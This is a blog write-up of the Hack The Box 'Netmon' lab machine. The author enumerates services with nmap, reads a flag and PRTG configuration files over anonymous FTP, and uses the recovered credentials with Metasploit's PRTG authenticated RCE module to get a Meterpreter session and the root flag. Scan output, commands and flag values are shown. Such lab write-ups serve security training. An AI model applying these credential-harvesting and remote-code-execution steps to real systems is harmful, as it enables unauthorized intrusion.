+++
title = "HTB - Netmon"
date = 2024-09-16
+++

<img alt="Image" async src="images/Netmon.png" width="800px"></img>

Netmon serves as a brilliant example of being very intentional and simple when looking for vectors to enumerate and services to exploit. I spent time going down a rabbit hole, albeit a shallow one, but the lesson was learned. It's also important to take very copious notes in these reports here, so from now on these will be very fleshed out.

### Reconnaissance
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-04 15:39 EDT
Nmap scan report for 10.10.10.152
Host is up (0.12s latency).
Not shown: 52259 closed tcp ports (reset), 13263 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_11-10-23  10:20AM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-server-header: PRTG/18.1.37.13946
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-09-04T19:41:21
|_  start_date: 2024-09-04T19:38:24

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 120.10 seconds

```

The scan gives us quite a bit. We've got access to FTP shares, a PRTG Monitor version 18.1.37.13946, and SMB. In hindsight, it's very simple and quite concise, so the trained eye merely comes from practice.

### Service Enumeration

Take the path of least resistance. Be water. Let's fucking go, yeah? Starting with FTP is the sensical choice, with anonymous login allowed, we're privy to quite a bit.

Initially, I'd completely skipped this vector... Dunno why.  `ftp anonymous@10.10.10.152` will yield access. Now, from now on, where applicable, `ls -la` takes precedence. This shows hidden directories, if any. 

```
┌──(root㉿kali)-[/home/li0t]
└─# ftp anonymous@10.10.10.152
Connected to 10.10.10.152.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls -la
229 Entering Extended Passive Mode (|||49858|)
150 Opening ASCII mode data connection.
11-20-16  10:46PM       <DIR>          $RECYCLE.BIN
02-03-19  12:18AM                 1024 .rnd
11-20-16  09:59PM               389408 bootmgr
07-16-16  09:10AM                    1 BOOTNXT
02-03-19  08:05AM       <DIR>          Documents and Settings
02-25-19  10:15PM       <DIR>          inetpub
09-06-24  05:49AM            738197504 pagefile.sys
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
12-15-21  10:40AM       <DIR>          ProgramData
02-03-19  08:05AM       <DIR>          Recovery
02-03-19  08:04AM       <DIR>          System Volume Information
02-03-19  08:08AM       <DIR>          Users
11-10-23  10:20AM       <DIR>          Windows
226 Transfer complete.

```

We get a lot here, but we don't know what it all means yet. Easiest path leads us down through public users to get our user flag.

```
ftp> more user.txt
0526c34b6f2df988e87b2d8d1abc7b4b
```

Theres nothing much else here in the `/Users` directory, and we cannot access administrator level ones without higher privileges. We'll come back here soon. Let's see what the web server has to offer.

<img alt="Image" async src="images/Screenshot 2024-09-04 at 3.45.47 PM.png" width="800px"></img>

Navigating to the website, we're met with a portal for this PRTG Network Monitor, and upon some research looking for version information and credentials, we find this interesting tidbits.

<img alt="Image" async src="images/Screenshot 2024-09-06 at 6.35.25 AM.png" width="800px"></img>
<img alt="Image" async src="images/Screenshot 2024-09-06 at 6.29.25 AM.png" width="800px"></img>
<img alt="Image" async src="images/Screenshot 2024-09-06 at 6.14.17 AM.png" width="800px"></img>

So, it looks like this version of the software keeps plaintext credentials in an old configuration file, and given the path in the photo, it looks like we can access through FTP. Navigating to `/ProgramData/Paessler/PRTG\ Network\ Monitor/` gives us access to the old configuration files, where we can find the credentials needed.

<img alt="Image" async src="images/Screenshot 2024-09-06 at 6.28.55 AM.png" width="800px"></img>

### Initial Access

Now, once found, we can use searchsploit to check if there's a MSF module for the RCE referenced above. 

```
┌──(root㉿kali)-[/home/li0t]
└─# searchsploit PRTG
------------------------------------------- ---------------------------------
 Exploit Title                             |  Path
------------------------------------------- ---------------------------------
PRTG Network Monitor 18.2.38 - (Authentica | windows/webapps/46527.sh
PRTG Network Monitor 20.4.63.1412 - 'maps' | windows/webapps/49156.txt
PRTG Network Monitor < 18.1.39.1648 - Stac | windows_x86/dos/44500.py
PRTG Traffic Grapher 6.2.1 - 'url' Cross-S | java/webapps/34108.txt
------------------------------------------- --------------------------------
```

Looks like we're in business. I'm going to use Metasploit for now because I'm pressed on time, but I'll come back through (for all MSF ones) and do it manually as well.

```
msf6 > search PRTG

Matching Modules
================

   #  Name                                                        Disclosure Date  Rank       Check  Description
   -  ----                                                        ---------------  ----       -----  -----------
   0  exploit/windows/http/prtg_authenticated_rce_cve_2023_32781  2023-08-09       excellent  Yes    PRTG CVE-2023-32781 Authenticated RCE
   1    \_ target: Windows_Fetch                                  .                .          .      .
   2    \_ target: Windows_CMDStager                              .                .          .      .
   3  exploit/windows/http/prtg_authenticated_rce                 2018-06-25       excellent  Yes    PRTG Network Monitor Authenticated RCE

```

Looks like 3 is what we want. I'll also set to a `bind_tcp` payload, as reverse has been throwing errors for me. Also, the box was published in 2019, and seeing as the password houses 2018, we can give both a shot for variance.

<img alt="Image" async src="images/Screenshot 2024-09-06 at 6.40.30 AM.png" width="800px"></img>

Let it rip, bear.

```
msf6 exploit(windows/http/prtg_authenticated_rce) > run

[+] Successfully logged in with provided credentials
[+] Created malicious notification (objid=2018)
[+] Triggered malicious notification
[+] Deleted malicious notification
[*] Waiting for payload execution.. (30 sec. max)
[*] Started bind TCP handler against 10.10.10.152:4444
[*] Sending stage (176198 bytes) to 10.10.10.152
[*] Meterpreter session 1 opened (10.10.14.3:37941 -> 10.10.10.152:4444) at 2024-09-06 06:40:53 -0400

meterpreter > 
```

### Post-Exploitation

Navigate to the administrator file that we didn't have access to before, and you'll get your flag.

```
meterpreter > cat root.txt 
45d31e16cd35bfb0311d0b7f3207e644
```
#easy #windows #msfconsole 
